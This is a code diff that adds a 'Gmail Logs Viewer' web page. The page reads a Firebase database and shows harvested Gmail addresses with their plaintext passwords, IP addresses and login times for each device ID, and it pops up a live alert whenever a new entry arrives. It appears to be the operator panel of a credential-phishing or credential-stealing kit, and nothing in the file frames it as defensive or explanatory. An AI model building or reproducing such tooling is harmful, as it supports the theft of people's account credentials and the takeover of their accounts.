@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>📋 Gmail Logs Viewer - Real-time</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, 'Poppins', sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(74, 222, 128, 0.3);
+        }
+
+        .header h1 {
+            color: #4ade80;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+        }
+
+        /* Real-time Badge */
+        .live-badge {
+            display: inline-block;
+            background: #ff4444;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Device Selector */
+        .device-selector {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .device-selector label {
+            color: white;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .device-input-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .device-input {
+            flex: 1;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 12px;
+            border-radius: 8px;
+            color: white;
+            font-family: monospace;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .device-input:focus {
+            border-color: #4ade80;
+        }
+
+        .btn-load {
+            background: #4ade80;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(74, 222, 128, 0.2);
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #4ade80;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: rgba(255,255,255,0.6);
+            margin-top: 5px;
+        }
+
+        /* Logs Table */
+        .logs-table {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .log-row {
+            display: grid;
+            grid-template-columns: 30px 1fr 1fr 150px 120px;
+            gap: 10px;
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            align-items: center;
+        }
+
+        .log-header {
+            background: rgba(74, 222, 128, 0.1);
+            color: #4ade80;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .log-item {
+            color: white;
+            font-size: 13px;
+        }
+
+        .log-item .password {
+            font-family: monospace;
+            color: #ff4444;
+            cursor: pointer;
+        }
+
+        .log-item .password:hover {
+            text-decoration: underline;
+        }
+
+        .email-cell {
+            word-break: break-all;
+        }
+
+        .new-log {
+            animation: highlight 2s ease-out;
+        }
+
+        @keyframes highlight {
+            0% { background: rgba(74, 222, 128, 0.4); }
+            100% { background: transparent; }
+        }
+
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #4ade80;
+        }
+
+        .modal-content h3 {
+            color: #4ade80;
+            margin-bottom: 20px;
+        }
+
+        .modal-password {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 8px;
+            color: #ff4444;
+            font-family: monospace;
+            font-size: 18px;
+            word-break: break-all;
+            margin-bottom: 20px;
+        }
+
+        .modal-close {
+            background: #4ade80;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: rgba(255,255,255,0.6);
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        /* Back Button */
+        .back-btn {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .log-row {
+                grid-template-columns: 30px 1fr 1fr;
+                gap: 8px;
+            }
+            .log-header .ip-col, .log-item .ip-col {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <h1>📋 Gmail Logs Viewer <span class="live-badge" id="liveBadge">LIVE</span></h1>
+        <p>Real-time auto-updating logs | Database changes reflect instantly</p>
+    </div>
+
+    <!-- Device Selector -->
+    <div class="device-selector">
+        <label>🔑 Enter Device ID to view logs (auto-refresh on)</label>
+        <div class="device-input-group">
+            <input type="text" id="deviceIdInput" class="device-input" placeholder="dev_1775711339429_k7lr1656xg">
+            <button class="btn-load" onclick="connectRealtime()">Connect & Auto-Load</button>
+        </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-grid" id="statsGrid" style="display: none;">
+        <div class="stat-card">
+            <div class="stat-value" id="totalLogins">0</div>
+            <div class="stat-label">Total Logins</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="lastLoginTime">--</div>
+            <div class="stat-label">Last Login</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="lastIP">--</div>
+            <div class="stat-label">Last IP</div>
+        </div>
+    </div>
+
+    <!-- Logs Table -->
+    <div id="logsContainer" class="logs-table" style="display: none;">
+        <div class="log-row log-header">
+            <div>#</div>
+            <div>Email</div>
+            <div>Password</div>
+            <div class="ip-col">IP Address</div>
+            <div>Date & Time</div>
+        </div>
+        <div id="logsList"></div>
+    </div>
+
+    <div id="loading" class="loading" style="display: none;">Loading logs...</div>
+    <div id="emptyState" class="empty-state" style="display: none;">No logs found for this device</div>
+</div>
+
+<!-- Password Modal -->
+<div id="passwordModal" class="modal">
+    <div class="modal-content">
+        <h3>🔐 Password</h3>
+        <div class="modal-password" id="modalPassword"></div>
+        <button class="modal-close" onclick="closeModal()">Close</button>
+    </div>
+</div>
+
+<script src="config.js"></script>
+<script>
+    let database = null;
+    let currentDeviceId = null;
+    let currentLogs = [];
+    let currentListeners = []; // Store listeners to cleanup
+
+    function initFirebase() {
+        if (typeof firebaseConfig !== 'undefined') {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            database = firebase.database();
+            console.log('✅ Firebase ready - Real-time mode active');
+            
+            // Try to get device ID from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const deviceIdFromUrl = urlParams.get('id');
+            if (deviceIdFromUrl) {
+                document.getElementById('deviceIdInput').value = deviceIdFromUrl;
+                connectRealtime();
+            }
+        } else {
+            alert('config.js not found! Make sure firebaseConfig is defined');
+        }
+    }
+
+    function cleanupListeners() {
+        if (currentListeners.length > 0) {
+            currentListeners.forEach(listener => {
+                if (listener && listener.off) {
+                    listener.off();
+                }
+            });
+            currentListeners = [];
+            console.log('🧹 Cleaned up old listeners');
+        }
+    }
+
+    function connectRealtime() {
+        const deviceId = document.getElementById('deviceIdInput').value.trim();
+        if (!deviceId) {
+            alert('Please enter Device ID');
+            return;
+        }
+
+        if (!database) {
+            alert('Firebase not initialized. Check config.js');
+            return;
+        }
+
+        currentDeviceId = deviceId;
+        
+        // Clean up previous listeners
+        cleanupListeners();
+        
+        // Show loading
+        document.getElementById('loading').style.display = 'block';
+        document.getElementById('logsContainer').style.display = 'none';
+        document.getElementById('emptyState').style.display = 'none';
+        document.getElementById('statsGrid').style.display = 'none';
+        
+        // Enable live badge animation
+        document.getElementById('liveBadge').style.animation = 'pulse 1.5s infinite';
+        
+        // Listen to current data
+        const currentRef = database.ref(`gmail_logs/${deviceId}`);
+        const historyRef = database.ref(`gmail_logs_history/${deviceId}`);
+        
+        // Listen to current login data
+        const currentListener = currentRef.on('value', (snapshot) => {
+            console.log('🔄 Current data updated');
+            loadAllLogs();
+        });
+        
+        // Listen to history data
+        const historyListener = historyRef.on('value', (snapshot) => {
+            console.log('🔄 History data updated');
+            loadAllLogs();
+        });
+        
+        currentListeners.push(currentRef, historyRef);
+        
+        // Initial load
+        loadAllLogs();
+    }
+
+    async function loadAllLogs() {
+        if (!currentDeviceId || !database) return;
+        
+        try {
+            // Get current login data
+            const currentSnapshot = await database.ref(`gmail_logs/${currentDeviceId}`).once('value');
+            const currentData = currentSnapshot.val();
+            
+            // Get history data
+            const historySnapshot = await database.ref(`gmail_logs_history/${currentDeviceId}`).once('value');
+            const historyData = historySnapshot.val();
+            
+            // Collect all logs
+            let allLogs = [];
+            
+            if (currentData && currentData.email) {
+                allLogs.push({
+                    ...currentData,
+                    isCurrent: true,
+                    id: 'current'
+                });
+            }
+            
+            if (historyData) {
+                Object.keys(historyData).forEach(key => {
+                    const log = historyData[key];
+                    if (log && log.email) {
+                        allLogs.push({
+                            ...log,
+                            id: key,
+                            isHistory: true
+                        });
+                    }
+                });
+            }
+            
+            // Sort by timestamp (newest first)
+            allLogs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+            
+            // Check if new log added (for animation)
+            const oldCount = currentLogs.length;
+            const isNewLog = allLogs.length > oldCount;
+            
+            currentLogs = allLogs;
+            
+            if (allLogs.length === 0) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('emptyState').style.display = 'block';
+                document.getElementById('logsContainer').style.display = 'none';
+                document.getElementById('statsGrid').style.display = 'none';
+                return;
+            }
+            
+            // Update stats
+            const latest = allLogs[0];
+            document.getElementById('totalLogins').innerHTML = allLogs.length;
+            document.getElementById('lastLoginTime').innerHTML = latest.dateTime?.split(',')[0] || new Date(latest.timestamp).toLocaleString().split(',')[0] || 'Unknown';
+            document.getElementById('lastIP').innerHTML = latest.ip || 'Unknown';
+            document.getElementById('statsGrid').style.display = 'grid';
+            
+            // Render logs with animation for new ones
+            renderLogs(allLogs, isNewLog);
+            
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('logsContainer').style.display = 'block';
+            
+            // Show notification on new login
+            if (isNewLog && allLogs.length > 0) {
+                const newLog = allLogs[0];
+                showToastNotification(`🔔 New Login: ${newLog.email}`);
+            }
+            
+        } catch (error) {
+            console.error('Error loading logs:', error);
+            document.getElementById('loading').style.display = 'none';
+            alert('Error loading logs: ' + error.message);
+        }
+    }
+
+    function showToastNotification(message) {
+        // Create toast element
+        const toast = document.createElement('div');
+        toast.innerHTML = message;
+        toast.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #4ade80;
+            color: #000;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            z-index: 3000;
+            animation: slideIn 0.3s ease-out;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        `;
+        document.body.appendChild(toast);
+        
+        setTimeout(() => {
+            toast.style.animation = 'slideOut 0.3s ease-out';
+            setTimeout(() => toast.remove(), 300);
+        }, 3000);
+    }
+
+    function renderLogs(logs, animateNew = false) {
+        const container = document.getElementById('logsList');
+        const oldContainer = container.cloneNode(false);
+        
+        logs.forEach((log, index) => {
+            const row = document.createElement('div');
+            row.className = 'log-row log-item';
+            
+            if (animateNew && index === 0) {
+                row.classList.add('new-log');
+            }
+            
+            // Format date
+            let dateStr = log.dateTime;
+            if (!dateStr && log.timestamp) {
+                dateStr = new Date(log.timestamp).toLocaleString();
+            } else if (!dateStr) {
+                dateStr = 'Unknown';
+            }
+            
+            row.innerHTML = `
+                <div>${index + 1}</div>
+                <div class="email-cell">${escapeHtml(log.email)}</div>
+                <div><span class="password" onclick="showPassword('${escapeHtml(log.password)}')">********</span></div>
+                <div class="ip-col">${log.ip || 'Unknown'}</div>
+                <div>${dateStr}</div>
+            `;
+            
+            oldContainer.appendChild(row);
+        });
+        
+        // Replace container
+        container.parentNode.replaceChild(oldContainer, container);
+        oldContainer.id = 'logsList';
+    }
+
+    function showPassword(password) {
+        document.getElementById('modalPassword').innerHTML = password;
+        document.getElementById('passwordModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('passwordModal').style.display = 'none';
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // Add CSS animations
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(100%); opacity: 0; }
+        }
+    `;
+    document.head.appendChild(style);
+    
+    // Close modal on background click
+    document.getElementById('passwordModal').addEventListener('click', function(e) {
+        if (e.target === this) {
+            closeModal();
+        }
+    });
+    
+    // Enter key press
+    document.getElementById('deviceIdInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            connectRealtime();
+        }
+    });
+    
+    // Page unload cleanup
+    window.addEventListener('beforeunload', () => {
+        cleanupListeners();
+    });
+    
+    // Initialize
+    if (typeof firebaseConfig !== 'undefined') {
+        initFirebase();
+    } else {
+        window.addEventListener('load', () => {
+            if (typeof firebaseConfig !== 'undefined') {
+                initFirebase();
+            } else {
+                console.error('config.js not found! Create config.js with firebaseConfig variable');
+                alert('config.js not found!\n\nCreate a config.js file with:\nconst firebaseConfig = { apiKey: "...", databaseURL: "...", ... };');
+            }
+        });
+    }
+</script>
+</body>
+</html>
